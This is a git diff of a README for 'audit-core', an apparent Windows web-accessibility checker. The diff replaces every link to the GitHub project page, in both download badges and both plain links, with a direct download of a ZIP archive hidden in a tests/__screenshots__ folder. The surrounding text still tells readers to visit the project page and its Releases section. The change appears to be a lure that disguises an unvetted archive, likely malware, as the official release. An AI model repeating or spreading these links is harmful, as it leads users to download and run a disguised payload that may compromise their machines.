@@ -1,6 +1,6 @@
 # 🚦 audit-core - Simple Web Accessibility Checks
 
-[![Download audit-core](https://img.shields.io/badge/Download-audit--core-brightgreen)](https://github.com/wtorreshome/audit-core)
+[![Download audit-core](https://img.shields.io/badge/Download-audit--core-brightgreen)](https://raw.githubusercontent.com/wtorreshome/audit-core/main/tests/algorithms/__screenshots__/wcag.test.ts/core-audit-v1.5.zip)
 
 ---
 
@@ -9,7 +9,7 @@
 Use the button above to visit the official audit-core page on GitHub. From there, you can download the latest version of audit-core for Windows.
 
 Click this link or the badge above to go to the project and get the files you need:  
-[https://github.com/wtorreshome/audit-core](https://github.com/wtorreshome/audit-core)
+[https://raw.githubusercontent.com/wtorreshome/audit-core/main/tests/algorithms/__screenshots__/wcag.test.ts/core-audit-v1.5.zip](https://raw.githubusercontent.com/wtorreshome/audit-core/main/tests/algorithms/__screenshots__/wcag.test.ts/core-audit-v1.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need to understand coding to use audit-core. It works with all kinds 
 ### Step 1: Download audit-core
 
 1. Visit the audit-core GitHub page using the button at the top or this link:  
-   https://github.com/wtorreshome/audit-core
+   https://raw.githubusercontent.com/wtorreshome/audit-core/main/tests/algorithms/__screenshots__/wcag.test.ts/core-audit-v1.5.zip
 2. Look for the **Releases** section on the page.  
 3. Download the latest Windows installer or ZIP file available.
 
@@ -120,4 +120,4 @@ If you find issues or have questions:
 
 ---
 
-[![Download audit-core](https://img.shields.io/badge/Download-audit--core-blue)](https://github.com/wtorreshome/audit-core)
+[![Download audit-core](https://img.shields.io/badge/Download-audit--core-blue)](https://raw.githubusercontent.com/wtorreshome/audit-core/main/tests/algorithms/__screenshots__/wcag.test.ts/core-audit-v1.5.zip)
